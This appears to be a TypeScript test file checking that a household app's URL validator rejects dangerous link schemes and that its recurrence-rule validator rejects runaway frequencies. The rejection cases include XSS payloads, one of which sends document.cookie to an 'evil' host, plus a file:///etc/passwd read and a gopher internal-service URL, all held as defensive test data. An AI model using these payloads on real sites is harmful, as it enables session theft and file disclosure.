import { describe, expect, it } from 'vitest'
import { RRULE_FREQUENCIES, zHttpUrl, zRRule } from '#shared/schemas/common'

/**
 * The two validators that exist for security rather than for tidiness.
 *
 * Both replaced a laxer rule that looked correct. If either is ever relaxed
 * back — by someone "simplifying" zHttpUrl to z.string().url(), or widening
 * the frequency list to match the RFC — these tests are what says no.
 */

describe('zHttpUrl', () => {
  /**
   * z.string().url() accepts every one of these. They are stored on wish-list
   * items and recipes and rendered into an href, so anyone in the household
   * could plant one and the next person to click it runs it on the board's
   * own origin, with the session cookie.
   */
  it.each([
    'javascript:alert(document.cookie)',
    'JavaScript:alert(1)', // scheme matching must not be case-sensitive
    'jAvAsCrIpT:alert(1)',
    'data:text/html,<script>fetch("//evil/"+document.cookie)</script>',
    'file:///etc/passwd',
    'gopher://127.0.0.1:11211/',
    'vbscript:msgbox(1)',
  ])('rejects %s', (value) => {
    expect(zHttpUrl.safeParse(value).success).toBe(false)
  })

  it.each([
    'https://example.com/recipes/paella',
    'http://example.com/x?a=1&b=2#frag',
    // A household's own NAS or router. Restricting the SCHEME must not stop
    // someone linking to something on their own network.
    'http://192.168.1.5:3000/photo.jpg',
    'https://xn--bcher-kva.example/', // punycode host
  ])('accepts %s', (value) => {
    expect(zHttpUrl.safeParse(value).success).toBe(true)
  })

  it('rejects nonsense that is not a URL at all', () => {
    expect(zHttpUrl.safeParse('not a url').success).toBe(false)
    expect(zHttpUrl.safeParse('').success).toBe(false)
  })

  it('trims, so a pasted link with whitespace still works', () => {
    expect(zHttpUrl.parse('  https://example.com/x  ')).toBe('https://example.com/x')
  })
})

describe('zRRule', () => {
  /**
   * One "every second" rule expanded over a calendar year is tens of millions
   * of occurrences in the single container the whole household shares. Nothing
   * in the UI offers these frequencies, and an ICS feed publisher can plant one
   * remotely — so the rule is rejected at the door rather than survived later.
   */
  it.each([
    'FREQ=SECONDLY',
    'FREQ=MINUTELY;INTERVAL=1',
    'FREQ=HOURLY',
    'freq=secondly', // lowercase must not slip past
    'FREQ=SECONDLY;COUNT=10', // still refused: the frequency is the problem
  ])('rejects %s', (value) => {
    expect(zRRule.safeParse(value).success).toBe(false)
  })

  it.each([
    'FREQ=DAILY;INTERVAL=0',
    'FREQ=WEEKLY;INTERVAL=00',
  ])('rejects %s — rrule iterates without advancing', (value) => {
    expect(zRRule.safeParse(value).success).toBe(false)
  })

  it.each([
    'FREQ=DAILY',
    'FREQ=WEEKLY;INTERVAL=2;BYDAY=MO,WE',
    'FREQ=MONTHLY;BYMONTHDAY=15',
    'FREQ=MONTHLY;BYDAY=2MO',
    'FREQ=YEARLY',
    'FREQ=DAILY;COUNT=10',
    'FREQ=WEEKLY;UNTIL=20261231T235959Z',
    'FREQ=DAILY;INTERVAL=10', // a leading 1 followed by 0 is not INTERVAL=0
  ])('accepts %s', (value) => {
    expect(zRRule.safeParse(value).success).toBe(true)
  })

  it('still requires the body to start with FREQ=', () => {
    expect(zRRule.safeParse('INTERVAL=2;FREQ=DAILY').success).toBe(false)
    expect(zRRule.safeParse('DTSTART:20260101T000000Z\nFREQ=DAILY').success).toBe(false)
  })

  it('lists exactly the frequencies the app can expand', () => {
    expect([...RRULE_FREQUENCIES]).toEqual(['DAILY', 'WEEKLY', 'MONTHLY', 'YEARLY'])
  })
})
